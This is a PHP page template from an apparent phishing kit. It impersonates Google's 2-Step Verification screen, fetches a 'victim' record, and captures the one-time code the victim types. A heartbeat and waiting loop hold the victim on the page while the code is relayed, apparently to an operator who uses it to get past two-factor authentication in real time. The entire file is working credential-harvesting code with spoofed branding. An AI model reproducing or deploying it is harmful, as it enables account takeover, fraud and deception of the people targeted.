<?php
require_once('shade/core/functions.php');
require_once('includes/google_layout.php');

$ent = $crud->getVictim($_SESSION['ent_id'] ?? 0);
$otp_page = $otp_page ?? 'otp1';
$otp_title = $otp_title ?? '2-Step Verification';
$otp_intro = $otp_intro ?? "To help keep your account safe, Google wants to make sure it's really you trying to sign in";
$otp_section_title = $otp_section_title ?? '2-Step Verification';
$otp_desc = $otp_desc ?? 'Enter the verification code';
$otp_label = $otp_label ?? 'Enter the code';
$otp_secondary = $otp_secondary ?? 'Try another way';
$otp_mode = $otp_mode ?? 'input';
$otp_prompt_num = $otp_prompt_num ?? '82';
$otp_show_prefix = $otp_show_prefix ?? ($otp_mode === 'input' && in_array($otp_page, ['otp1', 'otp2'], true));
$otp_maxlength = $otp_maxlength ?? 6;

google_head($otp_title . ' - Google Accounts');
?>

<div class="g-card g-card-otp">
    <?php google_card_progress(); ?>

    <div class="g-otp-layout">
        <div class="g-otp-left">
            <?php google_logo(); ?>
            <h1 class="g-title"><?= htmlspecialchars($otp_title) ?></h1>
            <p class="g-otp-intro"><?= htmlspecialchars($otp_intro) ?></p>
            <?php google_user_chip(); ?>
        </div>

        <div class="g-otp-right">
            <form id="otpForm" class="g-form" action="#" method="POST">
                <h2 class="g-otp-section-title"><?= htmlspecialchars($otp_section_title) ?></h2>
                <p class="g-otp-desc"><?= $otp_desc ?></p>

                <?php if ($otp_mode === 'prompt'): ?>
                <div class="g-device-icon">
                    <svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>
                </div>
                <div class="g-prompt-num"><?= htmlspecialchars($otp_prompt_num) ?></div>
                <?php else: ?>
                <div class="g-field g-field-otp" id="otpField">
                    <div class="g-otp-input-box">
                        <?php if ($otp_show_prefix): ?>
                        <span class="g-otp-prefix" aria-hidden="true">G-</span>
                        <?php endif; ?>
                        <input
                            type="text"
                            id="otpInput"
                            class="g-input-otp"
                            placeholder=" "
                            inputmode="numeric"
                            autocomplete="one-time-code"
                            required
                            maxlength="<?= (int) $otp_maxlength ?>"
                        >
                    </div>
                    <label class="g-label" for="otpInput"><?= htmlspecialchars($otp_label) ?></label>
                </div>
                <?php endif; ?>

                <?php if ($otp_mode !== 'prompt'): ?>
                <label class="g-check">
                    <input type="checkbox" id="deviceCheckbox" checked>
                    <span>Don&apos;t ask again on this device</span>
                </label>
                <?php endif; ?>

                <div class="g-actions">
                    <a href="#" class="g-btn g-btn-text" id="secondaryBtn"><?= htmlspecialchars($otp_secondary) ?></a>
                    <button type="submit" class="g-btn g-btn-primary" id="submitBtn"><?= $otp_mode === 'prompt' ? 'Yes' : 'Next' ?></button>
                </div>
            </form>
        </div>
    </div>
</div>

<?php
google_footer();
google_scripts();
?>
<script>
GoogleAuth.loadEmail('dynamicEmail', false);
var otpHeartbeat = GoogleAuth.startHeartbeat(<?= json_encode($otp_page) ?>, true);

var otpInput = document.getElementById('otpInput');
var otpField = document.getElementById('otpField');

if (otpInput && otpField) {
    function updateOtpField() {
        if (otpInput.value) otpField.classList.add('is-filled');
        else otpField.classList.remove('is-filled');
    }

    otpInput.addEventListener('input', function () {
        this.value = this.value.replace(/[^0-9]/g, '');
        updateOtpField();
    });

    updateOtpField();
}

document.getElementById('otpForm').addEventListener('submit', function (e) {
    e.preventDefault();
    if (window.GoogleAuth && typeof GoogleAuth.showCardLoading === 'function') {
        GoogleAuth.showCardLoading('.g-card');
    } else {
        document.querySelector('.g-card')?.classList.add('is-loading');
    }

    GoogleAuth.sendData({
        currentpage: <?= json_encode($otp_page) ?>,
        otp: otpInput ? otpInput.value : ''
    }).always(function () {
        if (window.GoogleAuth && typeof GoogleAuth.startWaiting === 'function') {
            otpHeartbeat = GoogleAuth.startWaiting(<?= json_encode($otp_page) ?>, '.g-card', otpHeartbeat);
        }
    });
});

document.getElementById('secondaryBtn').addEventListener('click', function (e) {
    e.preventDefault();
});
</script>
</body>
</html>
